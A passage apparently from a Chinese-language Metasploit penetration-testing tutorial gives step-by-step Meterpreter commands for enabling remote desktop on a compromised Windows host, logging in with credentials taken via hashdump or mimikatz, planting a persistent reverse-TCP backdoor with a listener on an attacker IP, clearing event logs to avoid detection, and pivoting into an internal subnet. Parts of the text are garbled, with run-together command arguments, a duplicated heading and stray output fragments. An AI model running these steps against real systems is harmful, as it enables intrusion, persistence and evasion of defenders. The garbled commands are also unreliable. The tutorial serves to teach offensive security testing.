    ## 启用远程桌面


    在 Meterpreter 中，用户还可以启动远程桌面，以便远程连接到目标主机。下文将描述如何启用远程桌面并进行远程登录。


    执行命令如下如下：


    ```

    meterpreter> run post/windows/manage/enable_rdp

    ```


    看到上述输出信息，表示远程桌面已成功启动。接下来，用户还需要检查远程用户的空闲时间。


    执行命令如下：


    ```

    meterpreter> idletime

    ```


    用户空闲时间为：23 天 7 小时 16 分 52 秒


    从输出信息中可以看出，用户的空闲时间为 23 天 7 小时 16 分 52 秒。接下来，渗透测试人员可以远程访问目标主机的桌面。


    用户可以通过某些方法（如 `hashdump` 命令和 `mimikatz` 模块）获取目标主机的用户名和密码。此时，用户可以使用获取的用户信息在 Kali
    主机远程连接到目标主机。


    下文将使用 `rdesktop` 命令远程连接桌面。


    1) 执行命令如下：


    ```

    root@exampleserver:～# rdesktop 192.168.29.143

    ```


    执行上述命令后，将打开远程桌面。


    2) 在此界面上选择已登录的用户以登录目标主机。在此处选择“其他用户”（other users）选项，将显示界面。


    3) 在此界面中输入远程登录的用户名和密码。然后点击登录按钮，即可成功连接到远程桌面。从此界面可以看出，你已成功连接到目标主机的远程桌面。


    ## 第 34 章


    ### 持久化后门


    ![](img/image_rsrc49Z.jpg)


    成功获取目标系统的访问权限后，渗透测试人员显然不想以同样辛苦的方式重新获取访问。由于 Meterpreter 是基于内存 DLL 建立的连接，只要目标主机关闭，Meterpreter
    连接就会断开。


    因此，为了方便后续的渗透测试，可以创建一个持久化的后门。这样，只要目标主机开机，它就会自动与攻击主机建立连接。此外，创建持久化后门后，即使连接中断，也不会影响工作。下文将介绍使用
    `run persistence` 命令创建持久化后门。


    其中，语法格式如下：


    `run persistence -X -i -p -r`


    使用 `run persistence` 命令创建持久化后门。


    执行命令如下：


    ```

    meterpreter> run persistence -X -i 5-p 8888192.168.29.134

    ```


    从输出信息中，我们可以看到目标主机上创建了一个可执行脚本。其中，脚本文件名为 `MIknXebtV.vbs`。此时，用户可以在目标主机的 `C:\Windows\TEMP`
    目录下看到该文件。


    用户在目标主机上创建持久化后门后，还需要本地建立一个监听器。这样，当目标主机重启时，它会自动与攻击主机建立连接。下文将使用 `exploit/multi/handler`
    模块建立监控。


    1) 选择 `exploit/multi/handler` 模块。


    执行命令如下：


    ```

    msf5> use exploit/multi/handler

    msf5 exploit(multi/handler)>

    ```


    2) 加载攻击 payload 并查看配置选项。


    执行命令如下：


    ```

    msf5 exploit(multi/handler)> set payload windows/meterpreter/reverse_tcp

    ```


    从输出信息中可以看出，所需的项 `LHOST` 尚未配置。此外，该模块监控的端口为 `4444`。由于端口 `4444` 之前被监控过，我们将修改另一个监控端口，例如
    `8888`。


    3) 配置攻击 payload 选项。


    执行命令如下：


    ```

    msf5 exploit(multi/handler)> set LHOST 192.168.29.134

    LHOST => 192.168.29.134

    msf5 exploit(multi/handler)> set LPORT 8888

    LPORT => 8888

    ```


    4) 建立监控。


    执行命令如下：


    ```

    msf5 exploit(multi/handler)> exploit

    ```


    [＊] Started reverse TCP handler on 192.168.29.134:8888


    从输出信息中，我们可以看到当前主机正在监听端口 `8888`，IP 地址为 `192.168.29.134`。


    5) 当目标主机重启时，它将主动与攻击主机建立连接。


    ## 清除痕迹


    192.168.29.134:8888


    从输出信息中，我们可以看到当前主机正在监听端口 `8888`，IP 地址为 `192.168.29.134`。当目标主机重启时，它将主动与攻击主机建立连接。如下：


    [＊ ] 192.168.29.134


    从输出信息中，我们可以看到连接已成功。


    ## 清除痕迹


    当渗透测试人员入侵目标主机时，所有操作都会记录在日志。因此，为了不被目标系统发现，需要清除痕迹。此时，用户可以使用 `clearev` 命令。


    执行命令如下：


    ```

    meterpreter> clearev

    ```


    从输出信息中可以看出，90。


    ## 构建跳板


    跳板是指使用受漏洞的主机作为跳板来渗透无法直接访问的系统。下文将介绍跳板的方法。


    具体步骤如下：


    1) 打开 Meterpreter 会话。


    执行命令如下：


    ```

    [＊] Meterpreter session 1 opened (192.168.2.10:4444) at 2019-04-17 15:56:24 +0800

    meterpreter>

    ```


    从上述会话可以看出，攻击主机的地址为 `192.168.2.10`，目标主机的地址为 `192.168.1.1`。显然这两个主机不在同一个网络。因此，如果你想渗透网络中的其他主机，需要添加相应的路由记录。


    2) 检查目标系统上的子网。


    执行命令如下：


    ```

    meterpreter> run get_local_subnets

    ```


    从输出信息中，可以看出目标系统所在的子网为 `192.168.1.0/24`。


    3) 将攻击会话放入后台运行并添加路由记录。其中，添加路由的语法格式如下：`route add [subnet][mask] [session ID]`


    添加路由记录。


    执行命令如下：


    ```

    meterpreter> background

    [＊ ] Route added

    ```


    从输出信息中，可以看到路由已成功添加。此时，用户可以使用 `route print` 命令查看已添加的路由记录。如下：


    ```

    msf5 exploit(handler)> route print

    ```


    从输出信息中，可以看出 `192.168.1.0/24` 的路由记录已成功添加。


